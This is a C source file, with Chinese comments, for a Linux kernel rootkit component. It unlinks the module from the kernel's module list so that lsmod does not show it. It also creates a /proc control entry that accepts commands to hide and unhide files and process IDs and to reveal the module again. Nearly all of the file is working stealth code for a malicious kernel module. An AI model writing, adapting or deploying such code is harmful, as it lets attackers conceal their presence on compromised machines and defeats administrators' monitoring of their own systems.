/**
 * 模块隐藏和proc接口管理头文件
 * 实现内核模块的隐藏/显示功能
 * 提供用户空间控制接口
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>

#include <linux/fs.h>
#include <linux/file.h>
#include <linux/string.h>

#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/sysfs.h>

#include "config.h"
#include "rproc.h"
#include "rfile.h"

// 模块隐藏相关变量
struct list_head *mode_prev;                    // 模块列表前一个节点
static struct list_head *_kobj_prev;            // kobject列表前一个节点
struct kobject *kobject_prev;                   // 前一个kobject
struct kobject *_parent_prev;                   // 前一个父kobject
static int mod_hide = 0;                        // 模块隐藏状态标志

/**
 * 隐藏内核模块
 * 从模块列表中移除当前模块，使其在lsmod中不可见
 */
void hide(void)
{
	if (mod_hide == 1)
	{
		return;
	}

	// 保存当前模块在列表中的位置
	mode_prev = THIS_MODULE->list.prev;
	
	// 保存kobject相关信息
	kobject_prev = &THIS_MODULE->mkobj.kobj;
	_parent_prev = THIS_MODULE->mkobj.kobj.parent;

	// 从模块列表中删除当前模块
	list_del(&THIS_MODULE->list); //procfs view
	
	// 清理section属性
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;

	// 保存kobject列表位置
	_kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;

	// 切换隐藏状态
	mod_hide = !mod_hide;
}

/**
 * 显示内核模块
 * 将隐藏的模块重新添加到模块列表中
 */
void show(void)
{
	if (!mod_hide)
		return;

	// 重新添加到模块列表
	list_add(&THIS_MODULE->list, mode_prev);

	// 切换隐藏状态
	mod_hide = !mod_hide;
}

// proc接口状态变量
static int _status = 0;

/**
 * proc文件写入处理函数
 * 处理用户空间发送的控制命令
 * 支持文件隐藏/显示、进程隐藏/显示、模块显示等操作
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
static ssize_t proc_path_write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos)
#else
static ssize_t proc_path_write(struct file *file, const char __user *buffer, unsigned long count, void *data)
#endif
{
	char _input[1024+1] = {0};
	char *user_dat;

	if (count > 0 && count < 1024)
	{
		user_dat = kmalloc(1024 + 1, GFP_KERNEL);
		if ( ! user_dat )
		   return -EFAULT;
		
		// 从用户空间复制数据
		if (copy_from_user(_input, buffer, count))
		{
			return -EFAULT;
		}
		_input[count-1] = 0;
		_input[count] = 0;

		// +f 命令：添加文件到隐藏列表
		if(_input[0] == '+' && _input[1] == 'f'){
			strncpy(user_dat, _input+2, count-2);
			file_hide(user_dat);
		}
		
		// -f 命令：从隐藏列表中移除文件
		if(_input[0] == '-' && _input[1] == 'f'){
			strncpy(user_dat, _input+2, count-2);
			file_unhide(user_dat);
		}
		
		// +p 命令：隐藏指定进程ID
		if(_input[0] == '+' && _input[1] == 'p'){
			strncpy(user_dat, _input+2, count-2);

			char *endp;
			long _pid = simple_strtoul(user_dat, &endp, 10);

			pid_hide(_pid);
			
			kfree(user_dat);
		}
		
		// -p 命令：显示指定进程ID
		if(_input[0] == '-' && _input[1] == 'p'){
			strncpy(user_dat, _input+2, count-2);
			
			char *endp;
			long _pid = simple_strtoul(user_dat, &endp, 10);

			pid_unhide(_pid);
			
			kfree(user_dat);
		}

		// dm 命令：显示模块（取消隐藏）
		if(strncmp(_input, "dm", 2) == 0)
		{
			show();
			
			_status = 1;
			
			kfree(user_dat);
		}

	}	

	return count;
}

/**
 * proc文件读取处理函数
 * 返回当前模块状态
 */
static int proc_path_show(struct seq_file *seq, void *v)
{
	seq_puts(seq, _status ? "true\n" : "false\n");

	return 0;
}

/**
 * proc文件打开处理函数
 */
static int proc_path_open(struct inode *inode, struct file *file)
{
	return single_open(file, proc_path_show, NULL);
}

// 新内核使用proc_ops结构
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static const struct proc_ops proc_path_proc_ops = {
	.proc_open = proc_path_open,
	.proc_read = seq_read,
	.proc_write = proc_path_write,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};
#endif

// 老内核使用file_operations结构
static const struct file_operations proc_path_fops = {
	.owner = THIS_MODULE,
	.open = proc_path_open,
	.read = seq_read,
	.write = proc_path_write,
	.llseek = seq_lseek,
	.release = single_release,
};

// proc目录项指针
static struct proc_dir_entry *this_proc;

/**
 * 初始化proc接口
 * 创建/proc/VMmisc控制接口
 * @return 成功返回0，失败返回错误码
 */
int proc_path_init(void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
	// 新内核版本使用proc_ops
	this_proc = proc_create(CTL_PROC_NAME, 0, NULL, &proc_path_proc_ops);
	if (NULL == this_proc)
	{
		return -ENOMEM;
	}
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
	// 3.9+内核版本
	this_proc = proc_create(CTL_PROC_NAME, 0, NULL, &proc_path_fops);
	if (NULL == this_proc)
	{
		return -ENOMEM;
	}
#else
	// 老版本内核
	this_proc = create_proc_entry(CTL_PROC_NAME, 0644, NULL);
	if (NULL == this_proc)
	{
		return -ENOMEM;
	}

	this_proc->write_proc = proc_path_write;

#endif

	return 0;
}

/**
 * 清理proc接口
 * 移除/proc/VMmisc控制接口
 */
void proc_path_exit(void)
{
	if (this_proc)
		remove_proc_entry(CTL_PROC_NAME, NULL);
}
